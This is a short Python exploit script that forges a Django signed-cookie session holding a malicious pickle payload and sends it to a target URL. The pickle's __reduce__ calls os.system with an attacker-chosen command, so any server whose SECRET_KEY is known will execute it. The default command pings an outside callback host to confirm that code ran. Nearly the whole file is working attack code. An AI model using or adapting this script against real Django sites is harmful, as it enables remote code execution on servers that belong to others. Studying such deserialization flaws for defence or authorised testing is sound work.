# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'

import os
import requests
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import pickle

def session_gen(SECRET_KEY,command = 'ping -n 3 test.0y0.link || ping -c test.0y0.link',):
    class Run(object):
        def __reduce__(self):
            #return (os.system,('ping test.0y0.link',))
            return (os.system,(command,))

    #SECRET_KEY = '1bb8)i&dl9c5=npkp248gl&aji7^x6izh3!itsmb6&yl!fak&f'
    SECRET_KEY = SECRET_KEY

    sess = signing.dumps(Run(), key = SECRET_KEY,serializer=PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
    #生成的恶意session
    print sess


    '''
    salt='django.contrib.sessions.backends.signed_cookies'
    sess = pickle.dumps(Run())
    sess = signing.b64_encode(sess)#通过跟踪signing.dumps函数可以知道pickle.dumps后的数据还经过了如下处理。
    sess = signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(sess)
    print sess
    #这里生成的session也是可以成功利用的，这样写只是为了理解signing.dumps。
    '''

    session = 'sessionid={0}'.format(sess)
    return session

def exp(url,SECRET_KEY,command):

    headers = {'Cookie':session_gen(SECRET_KEY,command)}
    proxy = {"http":"http://127.0.0.1:8080"}#设置为burp的代理方便观察请求包
    response = requests.get(url,headers= headers,proxies = proxy)
    #print response.content

if __name__ == '__main__':
    url = 'http://127.0.0.1:8000/'
    SECRET_KEY = '1bb8)i&dl9c5=npkp248gl&aji7^x6izh3!itsmb6&yl!fak&f'
    command = 'ping -n 3 test.0y0.link || ping -c test.0y0.link'
    exp(url,SECRET_KEY,command)